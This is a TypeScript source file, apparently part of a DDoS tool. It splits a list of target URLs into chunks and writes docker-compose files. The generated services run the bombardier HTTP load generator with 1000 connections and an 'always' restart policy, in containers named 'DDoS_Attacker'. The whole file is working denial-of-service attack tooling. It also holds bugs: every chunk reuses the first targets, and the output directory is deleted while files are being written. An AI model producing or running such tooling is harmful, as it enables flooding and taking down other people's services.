import fs from "fs";
import _ from "lodash";

/**
 * This is used to generate and save file for attack;
 *
 * Tabs are not supported by .yml files
 */
export class FileGenerator {
    private targets: string[] = [];

    private countPerChunk: number; //Count of targets per docker-file
    private SAVE_DIR: string;

    private DEFAULT_OUTPUT_DIR = 'attackTargets/lists';
    private DEFAULT_COUNT_PER_CHUNK = 10;
    private FILE_NAME = 'docker-compose.yml';
    private LISTS_COUNT_FILE_NAME = 'lists_count.txt';

    constructor(options: {
        targets: string[],
    }) {
        this.SAVE_DIR = process.env.OUTPUT_DIRECTORY || this.DEFAULT_OUTPUT_DIR;
        this.countPerChunk = Number(process.env.COUNT_PER_CHUNK) || this.DEFAULT_COUNT_PER_CHUNK;
        console.log('Date: ', new Date());
        console.log('Save directory: ', this.SAVE_DIR);
        console.log('count per chunk: ', this.countPerChunk);
        this.targets = options.targets;
    }

    public generateAndSave() {
        const chunks = _.chunk(this.targets, this.countPerChunk);

        chunks.forEach((chunk:string[], chunkIndex: number) => {
            const directory = this.SAVE_DIR + `/list_${chunkIndex}`;
            const filepath = `${directory}/` + this.FILE_NAME;
            let fileContent = "";

            fileContent+= "version: \"3.9\"\n";
            fileContent+= "services:\n";

            for (let i = 0; i < chunk.length; i++) {
                fileContent+= `   s${i}:\n`;
                fileContent+= "      image: alpine/bombardier\n";
                fileContent+= `      container_name: \"DDoS_Attacker_${i}\"\n`;
                fileContent+= `      command: [ \"-c\", \"1000\", \"-d\", \"60s\", \"-l\", \"${this.targets[i]}\" ]\n`;
                fileContent+= "      restart: \"always\"\n";
            }

            console.log('Saving into file: ', filepath);
            // Remove old files
            fs.rm(this.SAVE_DIR, {recursive: true}, () => {
                fs.mkdir(this.SAVE_DIR, { recursive: true }, () => {
                    // Creates directory if it is missing
                    fs.mkdir(directory, { recursive: true }, (err) => {
                        if (err) throw err;
                        //Save file
                        fs.writeFileSync(filepath, fileContent);
                    });

                    const countFileContent = `${chunks.length}`;
                    fs.writeFileSync(`${this.SAVE_DIR}/${this.LISTS_COUNT_FILE_NAME}`, countFileContent);
                });

            })
        });
    }
}
